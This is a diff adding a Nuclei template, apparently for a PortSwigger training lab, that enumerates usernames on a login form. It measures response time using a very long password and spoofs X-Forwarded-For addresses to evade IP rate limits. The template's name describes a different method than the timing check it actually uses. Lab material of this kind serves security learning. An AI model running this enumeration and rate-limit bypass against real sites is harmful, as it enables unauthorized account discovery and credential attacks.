@@ -1,0 +1,34 @@
+id: 3_lab_auth_portswigger_username_enum_via_time
+
+info:
+  name: Username enumeration via subtly different response
+  author: XI
+  severity: info
+  description: Username enumeration via subtly different response
+  reference: https://XI
+  tags: portswigger, learn, nuclei, auth
+
+http:
+  - raw:
+    - |
+      POST /login HTTP/2
+      Host: {{Host}}
+      Content-Type: application/x-www-form-urlencoded
+      X-Forwarded-For: 87.52.{{third_octet}}.{{last_octet}}
+
+      username={{username}}&password=1234567890-09876543234567890-0987654321234567890-[098765432134567890-098765432123456789098765432123456789098765432123456789098765432IRHRILUgiuwtjhu1323123123123123123123123123123123123123123ghetiuhgwiuetwrhgiurtwhgiuorthuighrtwuoighwueitvhoiuwerhobui4w
+
+    payloads:
+      third_octet: ./third_octet.txt
+      last_octet: ./last_octet.txt
+      username: ./usernames.txt
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 4"
+
+    cookie-reuse: False
+    stop-at-first-match: False
+    
+    attack: pitchfork
